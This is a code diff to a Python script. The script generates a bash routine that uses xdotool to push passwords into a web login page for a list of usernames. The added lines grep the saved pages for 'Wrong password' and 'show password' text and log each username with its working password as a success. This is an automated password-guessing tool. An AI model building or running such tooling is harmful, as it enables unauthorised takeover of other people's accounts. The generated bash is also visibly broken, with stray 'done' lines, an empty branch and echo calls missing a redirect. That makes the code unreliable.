@@ -114,24 +114,51 @@ for user in usernames:
     # Add a delay
     commands.append(f"sleep {delay}")
     
-    commands.append(f"xdotool mousemove {clear_ext} click 1")
     commands.append(f"sleep {wait_load}")
     commands.append(f"xdotool mousemove {all_data} click 1")
+    
+    # Process page result.
+    # Check whether a wrong password was submitted.
+    commands.append(f"result=`cat {output_dir}/$file | grep -i 'Wrong password. Try again' | wc -c`")
+    commands.append("if [ $result -eq 0 ]")
+    commands.append("then")
+    commands.append("incorrect_pass=False")
+    commands.append("else")
+    commands.append("incorrect_pass=True")
+    commands.append("fi")
+    commands.append("done")
+    
+    # Check whether a show password option exists.
+    commands.append(f"result=`cat {output_dir}/$file | grep -i 'show password' | wc -c`")
+    commands.append("if [ $result -eq 0 ]")
+    commands.append("then")
+    commands.append("else")
+    commands.append("show_pass=true")
+    commands.append("fi")
+    commands.append("done")
+    
+    # Determine whether the login was successful.
+    commands.append("if [ $show_pass = true ] || [ $incorrect_pass = true ]")
+    commands.append("then")
+    commands.append("success=False")
+    commands.append("else")
+    commands.append("success=True")
+    commands.append("fi")
+    commands.append("done")
+    
+    commands.append("if [ $success = True ]")
+    commands.append("then")
+    commands.append(f"echo \"{user} Success {password}\" {output_dir}/results.txt")
+    commands.append("else")
+    commands.append(f"echo \"{user} Failure\" {output_dir}/results.txt")
+    commands.append("fi")
     
 # Process raw output into a readable, exportable results file
 process_output = []
 process_output.append(f"for file in `ls {output_dir}`")
 process_output.append("do")
 
-# Check whether a wrong password was submitted.
-process_output.append(f"result=`cat {output_dir}/$file | grep -i 'Wrong password. Try again' | wc -c`")
-process_output.append("if [ $result -eq 0 ]")
-process_output.append("then")
-process_output.append("echo \"$file Success :D\"")
-process_output.append("else")
-process_output.append("echo \"$file Wrong Password :(\"")
-process_output.append("fi")
-process_output.append("done")
+
 
 # Write the executable bash script.
 print(f"Writing to '{target_filename}'...\n")
